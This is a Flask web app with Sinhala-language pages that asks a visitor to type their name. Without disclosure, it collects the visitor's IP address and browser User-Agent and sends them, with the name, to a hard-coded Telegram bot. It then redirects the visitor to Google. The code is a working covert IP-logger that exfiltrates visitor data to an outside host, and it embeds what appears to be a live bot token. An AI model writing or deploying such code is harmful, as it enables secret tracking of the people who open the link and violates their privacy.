from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# Telegram Bot Configurations
BOT_TOKEN = '7108929247:AAFW56Lkn8dyXISXH7lOJNIPPxzMlDGb0oU'
CHAT_ID = '1009817856'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Capture User Name
        user_name = request.form.get('name', 'Unknown User')
        
        # Capture User IP Address
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Capture User Agent
        user_agent = request.headers.get('User-Agent', 'Unknown User-Agent')
        
        # Send data to Telegram Bot
        message = f"නව පරිශීලක:\nIP ලිපිනය: {user_ip}\nපරිශීලක නම: {user_name}\nඋපාංගය: {user_agent}"
        telegram_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        requests.post(telegram_url, data={'chat_id': CHAT_ID, 'text': message})
        
        # Redirect to Google with Animation
        return render_template_string("""
        <!DOCTYPE html>
        <html lang="si">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Redirect වෙමින් පවතී...</title>
            <style>
                body {
                    margin: 0;
                    font-family: Arial, sans-serif;
                    background: linear-gradient(120deg, #6a11cb, #2575fc);
                    color: #fff;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    overflow: hidden;
                }
                .redirect-box {
                    text-align: center;
                    animation: fadeIn 2s ease-in-out;
                }
                h1 {
                    font-size: 2.5rem;
                    margin-bottom: 10px;
                }
                p {
                    font-size: 1.2rem;
                    margin-top: 0;
                }
                @keyframes fadeIn {
                    from {
                        opacity: 0;
                        transform: scale(0.8);
                    }
                    to {
                        opacity: 1;
                        transform: scale(1);
                    }
                }
                @keyframes bounce {
                    0%, 100% {
                        transform: translateY(0);
                    }
                    50% {
                        transform: translateY(-20px);
                    }
                }
                .loader {
                    margin: 20px auto;
                    width: 50px;
                    height: 50px;
                    border: 5px solid rgba(255, 255, 255, 0.3);
                    border-top-color: #fff;
                    border-radius: 50%;
                    animation: spin 1s linear infinite, bounce 1.5s ease-in-out infinite;
                }
                @keyframes spin {
                    to {
                        transform: rotate(360deg);
                    }
                }
            </style>
        </head>
        <body>
            <div class="redirect-box">
                <h1>තොරතුරු සාර්ථකව යවා ඇත!</h1>
                <p>ඔබ Google වෙත යොමු කරමින් පවතී...</p>
                <div class="loader"></div>
            </div>
            <script>
                setTimeout(function() {
                    window.location.href = "https://google.com";
                }, 5000);
            </script>
        </body>
        </html>
        """)

    return """
    <!DOCTYPE html>
    <html lang="si">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>පරිශීලක දත්ත ලබා ගැනීම</title>
        <style>
            body {
                margin: 0;
                font-family: 'Arial', sans-serif;
                background: linear-gradient(120deg, #6a11cb, #2575fc);
                color: #fff;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                text-align: center;
            }
            .form-container {
                background: rgba(255, 255, 255, 0.1);
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            }
            h1 {
                margin-bottom: 20px;
                font-size: 2rem;
            }
            form {
                display: flex;
                flex-direction: column;
                gap: 15px;
            }
            input, button {
                padding: 10px;
                border: none;
                border-radius: 25px;
                font-size: 1rem;
            }
            input {
                width: 300px;
                text-align: center;
            }
            button {
                background: #ff5722;
                color: #fff;
                cursor: pointer;
                transition: background 0.3s ease;
            }
            button:hover {
                background: #ff784e;
            }
        </style>
    </head>
    <body>
        <div class="form-container">
            <h1>ඔබේ නම ඇතුලත් කරන්න</h1>
            <form method="POST">
                <input type="text" name="name" placeholder="ඔබේ නම" required>
                <button type="submit">යවන්න</button>
            </form>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
